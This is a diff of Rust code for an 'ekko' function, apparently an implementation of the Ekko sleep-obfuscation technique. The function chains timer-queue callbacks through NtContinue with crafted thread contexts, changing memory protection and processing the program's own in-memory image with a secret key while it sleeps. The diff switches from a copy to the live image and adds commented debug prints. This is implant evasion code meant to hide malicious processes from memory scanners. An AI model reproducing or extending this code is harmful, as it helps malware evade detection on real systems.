@@ -99,12 +99,10 @@ pub fn ekko(sleep_time: u32, secret_key: &mut Vec<u8>) {
         buffer: secret_key.as_mut_ptr(),
     };
 
-    let mut image_buffer: Vec<u8> = unsafe { std::slice::from_raw_parts_mut(image_base as *mut u8, image_size as _).to_vec() };
-
     let mut data = UString {
-        length: image_buffer.len() as u32,
-        maximum_length: image_buffer.len() as u32,
-        buffer: image_buffer.as_mut_ptr(),
+        length: image_size as u32,
+        maximum_length: image_size as u32,
+        buffer: image_base as *mut u8,
     };
 
     let rtl_capture_context = unsafe { GetProcAddress(LoadLibraryA("ntdll\0".as_ptr()), "RtlCaptureContext\0".as_ptr()).unwrap() as u64 };
@@ -202,6 +200,7 @@ pub fn ekko(sleep_time: u32, secret_key: &mut Vec<u8>) {
         rop_set_evt.Rcx = h_event as u64;
         //dump_set_event_context(&rop_set_evt);
 
+        //println!("[INFO] Queue timers");
         unsafe 
         {
             CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rw as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD);
@@ -216,7 +215,11 @@ pub fn ekko(sleep_time: u32, secret_key: &mut Vec<u8>) {
 
             CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_set_evt as *const _ as *const _,  600, 0, WT_EXECUTEINTIMERTHREAD);
     
+            //println!("[INFO] Wait for hEvent");
+
             WaitForSingleObject(h_event, INFINITE); //0xFFFFFFFF
+
+            //println!("[INFO] Finished waiting for event");
         }
     }
 
